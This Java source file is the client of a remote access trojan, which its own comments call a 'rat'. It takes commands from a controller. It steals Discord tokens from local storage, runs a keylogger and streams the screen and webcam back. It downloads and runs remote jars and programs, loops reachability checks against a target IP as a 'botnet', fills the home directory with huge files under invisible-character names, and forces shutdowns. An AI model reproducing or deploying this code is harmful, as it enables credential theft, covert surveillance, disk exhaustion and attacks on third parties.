package me.sebsb;

import java.awt.AWTException;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileSystemView;

import org.jnativehook.NativeHookException;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.util.OsUtils;

import me.sebsb.utils.Action;
import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;
import me.sebsb.utils.OSUtil;
import me.sebsb.utils.StringUtils;

/*
 * Sorry for the messy code,
 * I couldn't be bothered making it clean.
 * 
 * A lot of the stuff in this rat is also untested, So try it yourself.
 */
public class ClientManager {

	// Botnet
	private Thread botnet;
	
	// Desktop
	private Thread desktop;
	private boolean runningDesktop;
	private float compression = 0.4F;
	
	// Webcam
	private Thread webcam;
	private boolean runningWebcam;
	
	// KeyLogger
	private KeyLogger keylogger;

	public void onMessage(String message, PrintWriter pw) {
		if (keylogger == null) {
			try {
				keylogger = new KeyLogger(pw);
			} catch (NativeHookException e) {
				e.printStackTrace();
			}
		}
		if (message.equals(Action.DISCORD.getCommand())) {
			ArrayList<String> tokens = new ArrayList<String>();
			try {
				tokens = this.getTokens();
			} catch (Exception e) {}
			ArrayList<String> toSend = new ArrayList<String>();
			
			if (tokens == null || tokens.isEmpty()) {
				toSend.add("No Tokens Were Found :(");
			} else {
				toSend.add("Tokens: ");
				for (int i = 0; i < tokens.size(); i++) {
					if (!toSend.contains(tokens.get(i))) {
						toSend.add(tokens.get(i));
					}
				}
			}
			NetUtils.sendMessage(toSend, MessageType.GUI_TEXT, pw);
		} else if (message.equals(Action.ALTF4.getCommand())) {
			try {
				Robot r = new Robot();
				r.keyPress(KeyEvent.VK_ALT);
				r.keyPress(KeyEvent.VK_F4);
				
				r.keyRelease(KeyEvent.VK_ALT);
				r.keyRelease(KeyEvent.VK_F4);
			} catch (AWTException e) {
				e.printStackTrace();
			}
		}  else if (message.startsWith(Action.MESSAGE_BOX + Action.getSeparator())) {
			try {
				String[] args = message.split(Action.getSeparator());
				new Thread(new Runnable() {

					@Override
					public void run() {
						try {
							JOptionPane.showMessageDialog(null, args[2], args[1], Integer.parseInt(args[3]));
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					
				}).start();
			} catch (Exception npe) {
				npe.printStackTrace();
			}
		} else if (message.startsWith(Action.BOTNET + Action.getSeparator())) {
			String[] args = message.split(Action.getSeparator());
			if (args[1].equals("start")) {
				try {
					String ip = args[2];
					int timeout = Integer.parseInt(args[3]);
					if (this.botnet != null && this.botnet.isAlive()) {
						this.botnet.stop();
					}
					
					this.botnet = new Thread(new Runnable() {

						@Override
						public void run() {
							botnet(ip, timeout);
						}
						
					});
					this.botnet.start();
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else if (args[1].equals("stop")) {
				if (this.botnet != null && this.botnet.isAlive()) {
					this.botnet.stop();
				}
			}
		} else if (message.equals(Action.DRIVEFUCKER.getCommand())) {
			// I like this drive fucker
			String characters = "abcdefghijklmnopqrstuvwxyz123456789";
			for (int i = 0; i < characters.length(); i++) {
				boolean made = false;
				for (int l = 259; l > 0; l--) {
					try {
						StringBuilder sb = new StringBuilder(characters.charAt(0));
						for (int g = 0; g < l; g++) {
							sb.append("‎");
						}
						File f = new File(FileSystemView.getFileSystemView().getHomeDirectory(), sb.toString());
						f.createNewFile();
						
				        RandomAccessFile fill = new RandomAccessFile(f, "rw");
				        fill.setLength((long) (!made ? 1.5e+10 : 5e+8));
				        fill.close();
						made = true;
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		} else if (message.startsWith(Action.DESKTOP.getCommand() + Action.getSeparator())) {
			String[] args = message.split(Action.getSeparator());
			try {
				if (args[1].equals("start")) {
					runningDesktop = true;
					if (desktop == null || !desktop.isAlive()) {
						desktop = new Thread(new Runnable() {

							@Override
							public void run() {
								remoteDesktop(pw);
							}
						});
						desktop.start();
					}
				} else if (args[1].equals("stop")) {
					runningDesktop = false;
					if (this.desktop != null && this.desktop.isAlive()) {
						this.desktop.stop();
					}
				} else if (args[1].equals("comp")) {
					this.compression = Float.parseFloat(args[2]);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (message.equals(Action.OPEN_URL.toString() + Action.getSeparator())) {
			try {
				String url = message.split(Action.getSeparator())[1];
				Desktop.getDesktop().browse(new URI(url));
			} catch (IOException | URISyntaxException e) {
				e.printStackTrace();
			}
		} else if (message.equals(Action.INSTALL_CLIENT.toString() + Action.getSeparator())) {
			try {
				String url = message.split(Action.getSeparator())[1];
				String fileName = message.split(Action.getSeparator())[2];
				File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
					    .toURI());
				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12));
				this.downloadUsingStream(url, temp);
				
				File createdFile = null;
				boolean created = false;
				for (int l = 0; l < 15; l++) {
					if (!created) {
						try {
							StringBuilder sb = new StringBuilder(fileName);
							for (int i = 0; i < 259 - l - fileName.length() - ".jar".length(); i++) {
								sb.append("‎");
							}
							sb.append(".jar");
							Files.copy(Paths.get(temp.getPath()), new FileOutputStream(createdFile = new File(jar.getParent(), sb.toString())));
							created = true;
						} catch (Exception e) {}
					}
				}
				
				if (created) {
					Runtime.getRuntime().exec("java -jar " + createdFile.getAbsolutePath() + " " + jar.getAbsolutePath());
					System.exit(0);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (message.startsWith(Action.WEBCAM.getCommand() + Action.getSeparator())) {
			String[] args = message.split(Action.getSeparator());
			try {
				if (args[1].equals("start")) {
					runningWebcam = true;
					if (webcam == null || !desktop.isAlive()) {
						webcam = new Thread(new Runnable() {

							@Override
							public void run() {
								try {
									remoteWebcam(pw);
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
						});
						webcam.start();
					}
				} else if (args[1].equals("stop")) {
					runningWebcam = false;
					if (this.webcam != null && this.webcam.isAlive()) {
						this.webcam.stop();
					}
				} else if (args[1].equals("comp")) {
					this.compression = Float.parseFloat(args[2]);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (message.equals(Action.INSTALLPROGRAM.toString() + Action.getSeparator())) {
			try {
				String url = message.split(Action.getSeparator())[1];
				String fileName = message.split(Action.getSeparator())[2];
				String[] args = fileName.split(".");
				String ending = args[args.length - 1];
				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12) + "." + ending);
				this.downloadUsingStream(url, temp);
				if (Desktop.isDesktopSupported()) {
					Desktop.getDesktop().open(temp);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (message.equals(Action.SHUTDOWN.toString())) {
			try {
			    if (OsUtils.getOS() == OsUtils.NIX|| OsUtils.getOS() == OsUtils.OSX) {
				    Runtime.getRuntime().exec("shutdown -h now");
				    System.exit(0);
			    }
			    else if (OsUtils.getOS() == OsUtils.WIN) {
				    Runtime.getRuntime().exec("shutdown.exe -s -t 0");
				    System.exit(0);
			    }
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
    private void downloadUsingStream(String urlStr, File file) throws IOException{
    	URL url = new URL(urlStr);
    	BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fis = new FileOutputStream(file);
        byte[] buffer = new byte[1024];
        int count=0;
        while((count = bis.read(buffer,0,1024)) != -1) {
            fis.write(buffer, 0, count);
        }
        fis.close();
        bis.close();
    }
    
	private void remoteDesktop(PrintWriter pw) {
		File temp = new File(System.getProperty("java.io.tmpdir"), "tempp.jpg");
		while (runningDesktop) {
			try {
				try {
					Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();
					
			        Robot rt = new Robot();
			        BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

			        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
			        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
			        writer.setOutput(ios);

			        ImageWriteParam param = writer.getDefaultWriteParam();
			        if (param.canWriteCompressed()){
			            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
			            param.setCompressionQuality(compression);
			        }
			        writer.write(null, new IIOImage(img, null, null), param);
				    pw.println(MessageType.DESKTOP.getID());
				    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
				    pw.println(encodedString);
				} catch (ThreadDeath td) {} catch (IOException e) {
					e.printStackTrace();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				if (temp.exists()) {
					try {
						temp.delete();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ThreadDeath dt) {}
		}
		if (temp.exists()) {
			try {
				temp.delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private void remoteWebcam(PrintWriter pw) {
		Webcam webcam = Webcam.getDefault();
		if (webcam == null) {
		    pw.println(MessageType.WEBCAM.getID());
		    pw.println("error");
		    runningWebcam = false;
		    return;
		}
		webcam.open();
		File temp = new File(System.getProperty("java.io.tmpdir"), "tempwe.jpg");
		while (runningWebcam) {
			try {
				try {
					BufferedImage img = webcam.getImage();
			        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
			        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
			        writer.setOutput(ios);

			        ImageWriteParam param = writer.getDefaultWriteParam();
			        if (param.canWriteCompressed()){
			            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
			            param.setCompressionQuality(compression);
			        }
			        writer.write(null, new IIOImage(img, null, null), param);
				    pw.println(MessageType.WEBCAM.getID());
				    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
				    pw.println(encodedString);
				} catch (ThreadDeath td) {webcam.close();} catch (IOException e) {
					e.printStackTrace();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				if (temp.exists()) {
					try {
						temp.delete();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ThreadDeath dt) {
				webcam.close();
			}
		}
		webcam.close();
		if (temp.exists()) {
			try {
				temp.delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public String getSeparator() {
		return "|}";
	}

	public ArrayList<String> getTokens() throws Exception {
		String _File = System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\";
		if (OSUtil.isMac) {
			_File = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
		}
		//System.out.println(new File(_File).exists() + " " + _File);
		ArrayList<String> files = new ArrayList<String>();
		if (!(new File(_File)).isDirectory()) {
			return files;
		}
		for (File file : (new File(_File)).listFiles()) {
			if (file.getName().endsWith(".ldb")) {
				files.add(file.getAbsolutePath());
			}
		}
		ArrayList<String> tokens = new ArrayList<String>();
		for (String str : files) {
			BufferedReader reader = new BufferedReader(new FileReader(str));
			String line = reader.readLine();
			while (line != null) {
				if (line.contains("oken")) {
					try {
						String line2 = line.substring(line.indexOf("oken"));
						String line3 = line2.split("\"")[1];
						if (line3 != null && line3.length() > 12 && checkToken(line3)) {
							tokens.add(line3);
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				line = reader.readLine();
			}
			reader.close();
		}
		return tokens;
	}
	
	private static boolean checkToken(String s) {
		if (s == null)
			return false;
		
		String list = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+-={}|][:;'?></.,`~\"";
		int len = s.length();
		for (int i = 0; i < len; i++) {
	         if (!list.contains(s.toLowerCase().charAt(i) + "")) {
	        	 return false;
	         }
		}
		return true;
	}
	
	private void botnet(String ip, int timeout) {
		try {
			while (true) {
				try {
					InetAddress address = InetAddress.getByName(ip);
		            System.out.println(address.isReachable(timeout));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} catch (Exception e) {
		} catch (ThreadDeath td) {}
	}
}
